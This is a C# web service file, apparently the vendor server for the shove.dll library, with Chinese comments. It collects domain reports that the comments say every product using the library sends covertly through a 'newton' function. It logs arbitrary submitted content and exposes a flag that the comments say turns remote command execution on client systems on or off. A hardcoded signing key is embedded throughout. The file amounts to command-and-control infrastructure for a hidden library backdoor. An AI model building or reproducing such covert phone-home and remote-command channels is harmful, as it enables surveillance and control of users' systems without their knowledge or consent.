using System;
using System.Collections.Generic;
using System.Web;
using System.Web.Services;

using Shove.Database;
using System.Data.SQLite;
using System.Web.Services.Protocols;

/// <summary>
///Service 的摘要说明
/// </summary>
[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
public class Service : System.Web.Services.WebService
{

    public Service()
    {
        //如果使用设计的组件，请取消注释以下行 
        //InitializeComponent(); 
    }

    //[WebMethod]
    //public int getSI(string Url, string Sign)
    //{
    //    string Key = "!@#$%^&*(3456SDFJUcvb#$%^56#$%^&dfghjk";
    //    if (Shove._Security.Encrypt.MD5(Url + Key).ToLower() != Sign.ToLower())
    //    {
    //        //return -1;
    //    }

    //    SQLiteConnection conn = new SQLiteConnection(Shove._Web.WebConfig.GetAppSettingsString("ConnectionString"));

    //    try
    //    {
    //        conn.Open();
    //    }
    //    catch
    //    {
    //        return -2;
    //    }

    //    SQLiteCommand cmd = new SQLiteCommand("insert into Urls (DateTime, Url) values (@DateTime, @Url)", conn);
    //    cmd.Parameters.Add("@DateTime", System.Data.DbType.DateTime).Value = DateTime.Now;
    //    cmd.Parameters.Add("@Url", System.Data.DbType.String).Value = Url;

    //    try
    //    {
    //        cmd.ExecuteNonQuery();
    //    }
    //    catch
    //    {
    //        conn.Close();

    //        return -3;
    //    }

    //    conn.Close();

    //    //Shove.Database.SQLite.ExecuteNonQuery("",
    //    //    new Shove.Database.SQLite.Parameter("DateTime", System.Data.DbType.DateTime, 0, System.Data.ParameterDirection.Input, DateTime.Now),
    //    //    new Shove.Database.SQLite.Parameter("Url", System.Data.DbType.String, 0, System.Data.ParameterDirection.Input, Url));

    //    return 0;
    //}


    /// <summary>
    /// 该方法为：凡使用了 shove.dll 组件的项目、产品，都会定时通过 newton 函数向本站点报告其域名。报告的方法为此方法。
    /// </summary>
    /// <param name="Url"></param>
    /// <param name="Sign"></param>
    /// <returns></returns>
    [WebMethod]
    public int getSI(string Url, string Sign)
    {
        string Key = "!@#$%^&*(3456SDFJUcvb#$%^56#$%^&dfghjk";
        if (Shove._Security.Encrypt.MD5(Url + Key).ToLower() != Sign.ToLower())
        {
            return -1;
        }

        new Log("Urls").Write(Url);

        return 0;
    }

    [WebMethod]
    public int getSI2(string Content, string Sign)
    {
        string Key = "!@#$%^&*(3456SDFJUcvb#$%^56#$%^&dfghjk";
        if (Shove._Security.Encrypt.MD5(Content + Key).ToLower() != Sign.ToLower())
        {
            return -1;
        }

        new Log("Content").Write(Content);

        return 0;
    }

    [WebMethod]
    public int getClientSIServiceStatus()
    {
        return 0; //1;
        // 0: 不开启，不能远程运行指令。1 开启。注意：不执行牛顿函数的时候把它置为 0
    }


    public MySoapHeader soapHeader = new MySoapHeader();

    [SoapHeader("soapHeader")]
    [WebMethod]
    public string TestSoapHeader()
    {
        if (!soapHeader.Valid())
        {
            return "用户名或密码错误！";
        }

        return "通过！";
    }
}

